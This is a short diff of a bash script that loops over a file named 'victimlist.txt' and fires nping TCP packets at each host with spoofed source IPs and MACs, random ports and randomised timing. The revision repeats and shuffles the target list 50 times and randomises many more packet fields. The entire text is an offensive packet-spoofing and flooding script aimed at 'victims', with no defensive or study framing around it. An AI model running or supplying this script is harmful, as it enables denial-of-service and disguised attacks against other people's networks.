@@ -1,9 +1,4 @@
-for dst in $(cat victimlist.txt)
+for dst in $(for i in {1..50}; do cat victimlist.txt; done | shuf)
 do
-	for src in $(shuf iplist.txt | head -n 10)
-	do
-		IFS='.' read -a payload <<< "$src"
-		sleep $(shuf -i 0-15 -n 1)
-		nping -S $src --data-length ${payload[0]} --tcp -p$(shuf -i 1-1024 -n 1) --source-mac random $dst
-	done
+	sudo nping -S random --data-length random --tcp -p$(shuf -i 1-1024 -n 1) --source-mac random --ack random --win random --tos random --id random --mtu random --rate random --delay $(shuf -i 0-10 -n 1) -c random --dest-ip $dst
 done
